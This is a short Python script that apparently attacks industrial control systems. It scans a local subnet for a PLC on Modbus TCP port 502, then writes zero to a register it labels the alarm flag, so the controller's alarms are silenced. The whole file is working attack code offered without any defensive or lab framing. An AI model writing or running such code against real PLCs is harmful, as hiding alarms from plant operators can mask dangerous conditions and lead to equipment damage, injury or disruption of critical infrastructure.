from pymodbus.client.sync import ModbusTcpClient
from pymodbus.exceptions import ModbusException
import socket
import time

# Function to discover the PLC's IP address
def discover_plc_ip():
    # Define the PLC's default IP range (adjust as needed)
    network_prefix = "192.168.1."
    for i in range(1, 255):
        ip = network_prefix + str(i)
        try:
            # Attempt to connect to the Modbus TCP port (default is 502)
            client = ModbusTcpClient(ip, port=502, timeout=1)
            if client.connect():
                print(f"Found PLC at IP: {ip}")
                client.close()
                return ip
        except (socket.timeout, ModbusException):
            continue
    print("PLC not found on the network.")
    return None

# Function to suppress alarms by modifying memory/flag values
def suppress_alarms(plc_ip):
    try:
        # Connect to the PLC
        client = ModbusTcpClient(plc_ip, port=502)
        if not client.connect():
            print("Failed to connect to the PLC.")
            return

        # Define the memory address for the alarm flag (adjust as needed)
        alarm_flag_address = 0x1000  # Example address
        suppress_value = 0x0000      # Value to suppress the alarm

        # Write the suppress value to the alarm flag address
        response = client.write_register(address=alarm_flag_address, value=suppress_value, unit=1)
        if response.isError():
            print(f"Failed to write to address {alarm_flag_address}: {response}")
        else:
            print(f"Alarm flag at address {alarm_flag_address} suppressed.")

        client.close()
    except ModbusException as e:
        print(f"Modbus error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

# Main function
def main():
    # Step 1: Discover the PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        return

    # Step 2: Suppress alarms
    suppress_alarms(plc_ip)

if __name__ == "__main__":
    main()